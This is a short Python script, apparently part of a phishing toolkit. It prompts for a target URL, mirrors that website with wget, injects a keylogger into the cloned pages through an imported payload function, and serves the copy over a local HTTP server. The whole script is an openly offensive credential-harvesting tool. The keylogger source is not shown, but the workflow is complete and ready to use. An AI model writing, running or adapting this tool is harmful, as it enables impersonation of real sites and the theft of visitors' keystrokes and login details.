import os
import subprocess
from payloads.payload_manager import inject_keylogger

url = input("🔍 Enter target URL: ")

print("🌐 Cloning site...")
# Make sure the output folder is clean
if os.path.exists("cloned_site"):
    subprocess.call(["rm", "-rf", "cloned_site"])
os.makedirs("cloned_site", exist_ok=True)

# Clone using wget
subprocess.call([
    "wget", "--mirror", "--convert-links", "--adjust-extension",
    "--page-requisites", "--no-parent", url, "-P", "cloned_site"
])

print("✅ Site cloned.")

# Inject keylogger
print("💉 Injecting keylogger...")
inject_keylogger("cloned_site")

# Start HTTP server to serve the cloned site
print("🚀 Hosting cloned site at http://localhost:7071")
os.system("python3 server.py")

